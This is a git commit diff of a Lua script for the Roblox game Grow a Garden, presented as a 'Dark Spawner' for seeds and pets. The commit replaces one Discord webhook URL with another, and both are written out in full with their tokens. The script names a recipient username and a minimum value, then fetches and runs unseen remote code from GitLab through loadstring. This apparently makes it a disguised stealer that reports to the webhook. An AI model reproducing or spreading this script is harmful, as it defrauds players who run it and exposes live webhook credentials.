328d9193c7a26ecaf554526488731167421675a1
k0sowa <kaitoyoshiro5@gmail.com>
2025-06-24 09:45:34 +0800

    Update GaG.lua

--- Dark-Spawner-seeds-pet/GaG.lua
+++ Dark-Spawner-seeds-pet/GaG.lua
@@ -1,6 +1,6 @@
 Username = "k0sowa"
 Webhook =
-"https://discord.com/api/webhooks/1386669178060279841/YITy9XLfRSjq73SJ2r2xz90mggWx3VKUH8AWzuT6mKRA7fMxEjZniLdMJYPYRhKDlmkD"
+"https://discord.com/api/webhooks/1386884346689884170/YSheRoAPcfv63GEauY220ryJTh__YcwkaxhQPuNsVM-anCLHly7Zun-Se2MDNT5cY1iu"
 MinimumValue = 1
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
